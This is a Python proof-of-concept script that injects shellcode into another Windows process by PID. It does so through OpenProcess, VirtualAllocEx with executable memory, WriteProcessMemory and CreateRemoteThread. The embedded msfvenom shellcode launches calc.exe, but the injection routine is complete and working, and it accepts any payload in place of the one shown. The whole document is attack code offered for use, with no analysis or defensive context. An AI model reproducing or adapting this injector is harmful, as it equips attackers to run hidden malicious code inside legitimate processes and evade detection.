# code injection PoC via CreateRemoteThread from Win32 API exported by kernel32.dll
import sys
from ctypes import *

def usage():
	print """
SYNOPSIS
python code_injection_PoC.py <pid>
"""

if len(sys.argv) != 2:
    usage()
    sys.exit(0)

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
pid = int(sys.argv[1])

# msfvenom -p windows/exec CMD=calc.exe -f python 
shellcode = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shellcode += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# obtain an handle to the process we are going to inject our dll
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*] Couldn't find PID: %s or couldn't acquire handle" % pid
    sys.exit(0)

# allocate enough memory to the dll path we are going to inject
arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# write the shellcode to the new allocated memory
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(written))

# call CreateRemoteThread with the entry point set to the head of our shellcode
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
    print "[*] Failed to inject code into memory."
    sys.exit(0)

print "[*] code injection successfull (thread ID: 0x%08x)" % thread_id.value

